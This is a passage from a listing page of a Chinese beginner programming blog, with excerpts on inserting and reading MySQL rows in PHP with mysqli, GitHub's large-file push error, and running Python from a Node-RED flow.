$sql="INSERT INTO table2(real_name,sex,birthday) VALUES('mo','man','2002');"; $sql .="INSERT INTO table2(real_name,sex,birthday) VALUES('ye','boy','10');"; $sql .="INSERT INTO table2(real_name,sex,birthday) VALUES('qin','man','22')"; if(mysqli_multi_query($conn,$sql)){ echo"多条数据插入成功"; }else{"Error:".$sql."&lt;br&gt;".mysqli_error($conn);} ?&gt; 使用图形化界面程序插入数据 使用phpMyadmin创建在数据表中插入数据；
进入phpMyAdmin
选择：“插入”选项
输入数值：
选择执行，即可在游览里面看到自己插入的数据：
二、MySQLi读取数据 SELECT语句用于从数据表中读取数据：
SELECT column_name(s) FROM table_name
可以使用*号来读取所有数据表中的字段：
SELECT * FROM table_name
举例代码如下：
//读取数据 $sql="select id,real_name,birthday from table2"; $result=mysqli_query($conn,$sql); //mysqli_fetch_assoc/的作用是从结果集中取得一行作为关联数组 if ($result){ while ($row=mysqli_fetch_assoc($result)){ echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47062f04c2f7717243321f0525c6d23c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fc8c03f2930b8ebc09636557c960e99/" rel="bookmark">
			【git】error: GH001: Large files detected. You may want to try Git Large File Storage - https://git-lf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【git】error: GH001: Large files detected. You may want to try Git Large File Storage - https://git-lf git上传大与100.00MB的文件到github上时报错：
remote: error: GH001: Large files detected. You may want to try Git Large Filetorage - https://git-lfs.github.com. remote: error: Trace: ~~ remote: error: See http://git.io/iEPt8g for more information. remote: error: File ~~ is 273.28 MB;his exceeds GitHub's file size limit of 100.00 MB To https://github.com/~~.git ! [remote rejected] master -&gt; master (pre-receive hook declined) error: failed to push some refs to 'https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fc8c03f2930b8ebc09636557c960e99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c31f7a64997d18718fa187f681c0e754/" rel="bookmark">
			node-red执行Python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		node-red和python的结合使用，直接就是神器，前端和后端就都有了
图片如下
见代码
[ { "id": "59d5b15.ad8035", "type": "template", "z": "eeb650e6.286b2", "name": "python content", "field": "payload", "fieldType": "msg", "format": "python", "syntax": "mustache", "template": "import os\na=os.getcwd()\nprint(a)", "output": "str", "x": 380, "y": 140, "wires": [ [ "674727ec.c18738" ] ] }, { "id": "afcb6ff0.29a97", "type": "inject", "z": "eeb650e6.286b2", "name": "", "props": [ { "p": "payload" }, { "p": "topic", "vt": "str" } ], "repeat": "", "crontab": "", "once": false, "onceDelay": 0.1, "topic": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c31f7a64997d18718fa187f681c0e754/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/192/">«</a>
	<span class="pagination__item pagination__item--current">193/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/194/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>